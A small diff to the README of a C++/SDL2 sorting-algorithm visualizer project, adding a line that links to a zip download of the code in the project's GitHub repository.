@@ -1,6 +1,6 @@
 # Sorting Visualizer
 
-
+Download [Code](https://github.com/Ayushm2112/Sorting-Visualizer/blob/main/Sorting-Visualizer-master.zip)
 
 Visualization of different sorting algorithms in C++ with SDL2 Library.
 
